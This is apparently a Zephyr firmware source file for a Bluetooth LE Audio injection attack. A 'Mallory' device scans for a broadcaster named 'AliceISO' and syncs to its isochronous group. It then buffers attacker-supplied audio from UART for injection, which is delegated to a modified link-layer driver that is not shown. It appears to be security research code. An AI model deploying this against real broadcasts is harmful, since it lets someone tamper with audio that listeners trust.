/*
 * Copyright (c) 2021-2024 Nordic Semiconductor ASA
 *
 * SPDX-License-Identifier: Apache-2.0
 */

#include <zephyr/device.h>
#include <zephyr/devicetree.h>
#include <zephyr/bluetooth/bluetooth.h>
#include <zephyr/bluetooth/conn.h>
#include <zephyr/bluetooth/hci_types.h>
#include <zephyr/bluetooth/iso.h>
#include <zephyr/sys/byteorder.h>
#include <zephyr/sys/ring_buffer.h>

#include <zephyr/usb/usb_device.h>
#include <zephyr/drivers/uart.h>

// Debug markers
#define DEBUG_MARKER_SCAN     0xA0
#define DEBUG_MARKER_FOUND    0xA1
#define DEBUG_MARKER_SYNC     0xA2
#define DEBUG_MARKER_BIG      0xA3
#define DEBUG_MARKER_ATTACK   0xA4
#define DEBUG_MARKER_AUDIO    0xA5

#define TIMEOUT_SYNC_CREATE K_SECONDS(10)
#define NAME_LEN            30

#define BT_LE_SCAN_CUSTOM BT_LE_SCAN_PARAM(BT_LE_SCAN_TYPE_ACTIVE, \
				       BT_LE_SCAN_OPT_NONE, \
				       BT_GAP_SCAN_FAST_INTERVAL, \
				       BT_GAP_SCAN_FAST_WINDOW)

#define PA_RETRY_COUNT 6
#define BIS_ISO_CHAN_COUNT 1

#define AUDIO_PACKET_SIZE 160 // 8kHz, 16-bit mono = 160 bytes per 10ms

// Audio buffer - shared with lll_sync_iso.c
#define MALLORY_AUDIO_BUF_SIZE 1600
uint8_t mallory_audio_ring_storage[MALLORY_AUDIO_BUF_SIZE];
struct ring_buf mallory_audio_ring;

// Current audio packet for injection
uint8_t mallory_injection_buf[AUDIO_PACKET_SIZE];
volatile bool mallory_injection_ready = false;

// UART RX buffer
#define UART_RX_BUF_SIZE 256
static uint8_t uart_rx_buf[UART_RX_BUF_SIZE];
static const struct device *uart_dev;

static bool         per_adv_found;
static bool         per_adv_lost;
static bt_addr_le_t per_addr;
static uint8_t      per_sid;
static uint32_t     per_interval_us;

static K_SEM_DEFINE(sem_per_adv, 0, 1);
static K_SEM_DEFINE(sem_per_sync, 0, 1);
static K_SEM_DEFINE(sem_per_sync_lost, 0, 1);
static K_SEM_DEFINE(sem_per_big_info, 0, 1);
static K_SEM_DEFINE(sem_big_sync, 0, BIS_ISO_CHAN_COUNT);
static K_SEM_DEFINE(sem_big_sync_lost, 0, BIS_ISO_CHAN_COUNT);

static void iso_recv(struct bt_iso_chan *chan, const struct bt_iso_recv_info *info, struct net_buf *buf);
static void iso_connected(struct bt_iso_chan *chan);
static void iso_disconnected(struct bt_iso_chan *chan, uint8_t reason);

static struct bt_iso_chan_ops iso_ops = {
    .recv       = iso_recv,
    .connected  = iso_connected,
    .disconnected   = iso_disconnected,
};

static struct bt_iso_chan_io_qos iso_rx_qos[BIS_ISO_CHAN_COUNT];

static struct bt_iso_chan_qos bis_iso_qos[] = {
    { .rx = &iso_rx_qos[0], },
};

static struct bt_iso_chan bis_iso_chan[] = {
    { .ops = &iso_ops, .qos = &bis_iso_qos[0], },
};

static struct bt_iso_chan *bis[] = {
    &bis_iso_chan[0],
};

static struct bt_iso_big_sync_param big_sync_param = {
    .bis_channels = bis,
    .num_bis = BIS_ISO_CHAN_COUNT,
    .bis_bitfield = (BIT_MASK(BIS_ISO_CHAN_COUNT)),
    .mse = BT_ISO_SYNC_MSE_ANY,
    .sync_timeout = 300,
};

// Send debug marker
static void debug_marker(uint8_t marker)
{
    uart_poll_out(uart_dev, marker);
    uart_poll_out(uart_dev, marker);
    uart_poll_out(uart_dev, marker);
    uart_poll_out(uart_dev, marker);
}

// UART RX callback
static void uart_rx_callback(const struct device *dev, void *user_data)
{
    ARG_UNUSED(user_data);

    while (uart_irq_update(dev) && uart_irq_is_pending(dev)) {
        if (uart_irq_rx_ready(dev)) {
            int recv_len = uart_fifo_read(dev, uart_rx_buf, UART_RX_BUF_SIZE);
            if (recv_len > 0) {
                ring_buf_put(&mallory_audio_ring, uart_rx_buf, recv_len);
            }
        }
    }
}

static bool data_cb(struct bt_data *data, void *user_data)
{
    char *name = user_data;
    uint8_t len;

    switch (data->type) {
    case BT_DATA_NAME_SHORTENED:
    case BT_DATA_NAME_COMPLETE:
        len = MIN(data->data_len, NAME_LEN - 1);
        memcpy(name, data->data, len);
        name[len] = '\0';
        return false;
    default:
        return true;
    }
}

static void scan_recv(const struct bt_le_scan_recv_info *info,
              struct net_buf_simple *buf)
{
    char name[NAME_LEN];
    (void)memset(name, 0, sizeof(name));
    bt_data_parse(buf, data_cb, name);

    bool is_alice = (strcmp(name, "AliceISO") == 0);

    if (!per_adv_found && info->interval && is_alice) {
        debug_marker(DEBUG_MARKER_FOUND);
        per_adv_found = true;
        per_sid = info->sid;
        per_interval_us = BT_CONN_INTERVAL_TO_US(info->interval);
        bt_addr_le_copy(&per_addr, info->addr);
        k_sem_give(&sem_per_adv);
    }
}

static struct bt_le_scan_cb scan_callbacks = {
    .recv = scan_recv,
};

static void sync_cb(struct bt_le_per_adv_sync *sync,
            struct bt_le_per_adv_sync_synced_info *info)
{
    debug_marker(DEBUG_MARKER_SYNC);
    k_sem_give(&sem_per_sync);
}

static void term_cb(struct bt_le_per_adv_sync *sync,
            const struct bt_le_per_adv_sync_term_info *info)
{
    per_adv_lost = true;
    k_sem_give(&sem_per_sync_lost);
}

static void recv_cb(struct bt_le_per_adv_sync *sync,
            const struct bt_le_per_adv_sync_recv_info *info,
            struct net_buf_simple *buf)
{
}

static void biginfo_cb(struct bt_le_per_adv_sync *sync,
               const struct bt_iso_biginfo *biginfo)
{
    debug_marker(DEBUG_MARKER_BIG);
    k_sem_give(&sem_per_big_info);
}

static struct bt_le_per_adv_sync_cb sync_callbacks = {
    .synced = sync_cb,
    .term = term_cb,
    .recv = recv_cb,
    .biginfo = biginfo_cb,
};

static void iso_recv(struct bt_iso_chan *chan, const struct bt_iso_recv_info *info,
        struct net_buf *buf)
{
    // Driver handles injection
}

static void iso_connected(struct bt_iso_chan *chan)
{
    debug_marker(DEBUG_MARKER_ATTACK);
    if (chan == &bis_iso_chan[0] || chan == &bis_iso_chan[1]) {
        k_sem_give(&sem_big_sync);
    }
}

static void iso_disconnected(struct bt_iso_chan *chan, uint8_t reason)
{
    if (chan == &bis_iso_chan[0] || chan == &bis_iso_chan[1]) {
         if (reason != BT_HCI_ERR_OP_CANCELLED_BY_HOST) {
            k_sem_give(&sem_big_sync_lost);
        }
    }
}

static void reset_semaphores(void)
{
    k_sem_reset(&sem_per_adv);
    k_sem_reset(&sem_per_sync);
    k_sem_reset(&sem_per_sync_lost);
    k_sem_reset(&sem_per_big_info);
    k_sem_reset(&sem_big_sync);
    k_sem_reset(&sem_big_sync_lost);
}

// Audio feeder thread - reads from ring buffer and prepares injection buffer
static volatile uint32_t audio_packets_prepared = 0;
static volatile uint32_t total_audio_bytes_received = 0;

static void audio_feeder_thread(void *p1, void *p2, void *p3)
{
    ARG_UNUSED(p1);
    ARG_UNUSED(p2);
    ARG_UNUSED(p3);

    while (true) {
        uint32_t bytes_read = ring_buf_get(&mallory_audio_ring, 
                                           mallory_injection_buf, 
                                           AUDIO_PACKET_SIZE);
        
        if (bytes_read > 0) {
            total_audio_bytes_received += bytes_read;
        }
        
        if (bytes_read < AUDIO_PACKET_SIZE) {
            memset(&mallory_injection_buf[bytes_read], 0, 
                   AUDIO_PACKET_SIZE - bytes_read);
        }
        
        mallory_injection_ready = true;
        audio_packets_prepared++;
        
        // Send marker every 100 packets (~1 second)
        // 0xA5 = empty buffer, 0xA6 = has real audio data
        if (audio_packets_prepared % 100 == 0) {
            if (bytes_read >= AUDIO_PACKET_SIZE / 2) {
                debug_marker(0xA6);  // Has audio data
            } else {
                debug_marker(DEBUG_MARKER_AUDIO);  // Empty/sparse buffer
            }
        }
        
        k_sleep(K_USEC(10000));
    }
}

K_THREAD_DEFINE(audio_feeder, 1024, audio_feeder_thread, NULL, NULL, NULL, 5, 0, 0);

int main(void)
{
    ring_buf_init(&mallory_audio_ring, MALLORY_AUDIO_BUF_SIZE, mallory_audio_ring_storage);

    if (usb_enable(NULL)) {
        return 0;
    }

    uart_dev = DEVICE_DT_GET(DT_CHOSEN(zephyr_console));
    if (!device_is_ready(uart_dev)) {
        return 0;
    }

    uint32_t dtr = 0;
    while (!dtr) {
        uart_line_ctrl_get(uart_dev, UART_LINE_CTRL_DTR, &dtr);
        k_sleep(K_MSEC(100));
    }
    k_sleep(K_SECONDS(1));

    // Setup UART interrupt-driven RX
    uart_irq_callback_set(uart_dev, uart_rx_callback);
    uart_irq_rx_enable(uart_dev);

    debug_marker(DEBUG_MARKER_SCAN);

    int err;

    err = bt_enable(NULL);
    if (err) {
        return 0;
    }

    bt_le_scan_cb_register(&scan_callbacks);
    bt_le_per_adv_sync_cb_register(&sync_callbacks);

    struct bt_le_per_adv_sync_param sync_create_param;
    struct bt_le_per_adv_sync *sync;
    struct bt_iso_big *big_rx;

    do {
        reset_semaphores();
        per_adv_lost = false;

        per_adv_found = false;
        err = bt_le_scan_start(BT_LE_SCAN_CUSTOM, NULL);
        if (err) {
            return 0;
        }

        err = k_sem_take(&sem_per_adv, K_FOREVER);
        if (err) {
            return 0;
        }

        bt_le_scan_stop();

        bt_addr_le_copy(&sync_create_param.addr, &per_addr);
        sync_create_param.options = 0;
        sync_create_param.sid = per_sid;
        sync_create_param.skip = 0;
        sync_create_param.timeout = 0x190; 

        err = bt_le_per_adv_sync_create(&sync_create_param, &sync);
        if (err) {
            continue;
        }

        err = k_sem_take(&sem_per_sync, K_SECONDS(2));
        if (err) {
            bt_le_per_adv_sync_delete(sync);
            continue;
        }

        err = k_sem_take(&sem_per_big_info, K_SECONDS(2));
        if (err) {
            bt_le_per_adv_sync_delete(sync);
            continue;
        }

        err = bt_iso_big_sync(sync, &big_sync_param, &big_rx);
        if (err) {
            bt_le_per_adv_sync_delete(sync);
            continue;
        }

        for (uint8_t chan = 0U; chan < BIS_ISO_CHAN_COUNT; chan++) {
            k_sem_take(&sem_big_sync, TIMEOUT_SYNC_CREATE);
        }

        k_sem_take(&sem_per_sync_lost, K_FOREVER);

        bt_iso_big_terminate(big_rx);
        bt_le_per_adv_sync_delete(sync);
        k_sleep(K_MSEC(1000));

    } while (true);
}